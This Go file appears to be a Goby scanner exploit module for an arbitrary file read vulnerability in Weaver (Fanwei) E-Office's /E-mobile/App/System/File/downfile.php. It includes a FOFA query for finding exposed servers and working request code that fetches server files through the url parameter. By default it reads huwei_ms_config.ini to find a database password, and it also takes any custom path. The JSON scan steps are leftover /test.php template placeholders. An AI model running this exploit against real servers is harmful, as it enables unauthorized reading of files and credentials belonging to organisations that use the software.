package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "FanweiE-Office /E-mobile/App/System/File/downfile.php File Read Vulnerability",
    "Description": "<p>Fanwei E-Office is an enterprise-level full-process office automation software, which includes multiple modules such as collaborative office, document management, knowledge management, workflow management, etc., covering all aspects of the daily work of the enterprise. Fanwei E-Office can help enterprises realize the digitization and automation of the entire process, improve work efficiency and management quality, reduce management costs, and provide enterprises with comprehensive, efficient and convenient office services. The system/E-mobile/App/System/File/downfile.php has an arbitrary file download vulnerability, through which attackers can download any file on the service.</p>",
    "Product": "Weaver-EOffice",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2024-08-30",
    "PostTime": "2024-09-29",
    "Author": "2826161446@qq.com",
    "FofaQuery": "((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"Server: eOffice\") && body!=\"Server: couchdb\") || banner=\"general/login/index.php\" || body=\"/eoffice10/client\"",
    "GobyQuery": "((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"Server: eOffice\") && body!=\"Server: couchdb\") || banner=\"general/login/index.php\" || body=\"/eoffice10/client\"",
    "Level": "1",
    "Impact": "<p>There is an arbitrary file download vulnerability in the system/E-mobile/App/System/File/downfile.php. Through this vulnerability, an attacker can download any file on the service.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://github.com/eckert-lcc/cve/blob/main/Weaver%20oa.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "huwei_ms_config.ini",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "2H1W",
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "泛微E-Office /E-mobile/App/System/File/downfile.php 文件读取漏洞",
            "Product": "泛微-EOffice",
            "Description": "<p>泛微E-Office是一款企业级的全流程办公自动化软件，它包括协同办公、文档管理、知识管理、工作流管理等多个模块，涵盖了企业日常工作中的各个环节。泛微E-Office能够帮助企业实现全流程数字化、自动化，提高工作效率和管理质量，降低管理成本，为企业提供全面、高效、便捷的办公服务。该系统/E-mobile/App/System/File/downfile.php存在任意文件下载漏洞，通过该漏洞攻击者可以下载服务上任意文件。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>该系统/E-mobile/App/System/File/downfile.php存在任意文件下载漏洞，通过该漏洞攻击者可以下载服务上任意文件。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "两高一弱",
                "文件读取"
            ]
        },
        "EN": {
            "Name": "FanweiE-Office /E-mobile/App/System/File/downfile.php File Read Vulnerability",
            "Product": "Weaver-EOffice",
            "Description": "<p>Fanwei E-Office is an enterprise-level full-process office automation software, which includes multiple modules such as collaborative office, document management, knowledge management, workflow management, etc., covering all aspects of the daily work of the enterprise. Fanwei E-Office can help enterprises realize the digitization and automation of the entire process, improve work efficiency and management quality, reduce management costs, and provide enterprises with comprehensive, efficient and convenient office services. The system/E-mobile/App/System/File/downfile.php has an arbitrary file download vulnerability, through which attackers can download any file on the service.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>There is an arbitrary file download vulnerability in the system/E-mobile/App/System/File/downfile.php. Through this vulnerability, an attacker can download any file on the service.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "2H1W",
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9957"
}`
	postOrGet_zasqefasf123asdfafe1412afdawaq := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		// 注意：返回值为（最终要返回的读取结果，错误）
		requestConfig := httpclient.NewGetRequestConfig("/E-mobile/App/System/File/downfile.php?url=/building/backmgr/urlpage/mobileurl/configfile/" + fileUrl)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to read file")
			return "", err
		}
		respTxt = resp.RawBody
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/E-mobile/App/System/File/downfile.php"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"huwei_ms_config.ini": "datapassword =",
			}
			// 函数继承
			uploadFileFunc := postOrGet_zasqefasf123asdfafe1412afdawaq

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"string": {"huwei_ms_config.ini", "datapassword ="},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_zasqefasf123asdfafe1412afdawaq

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
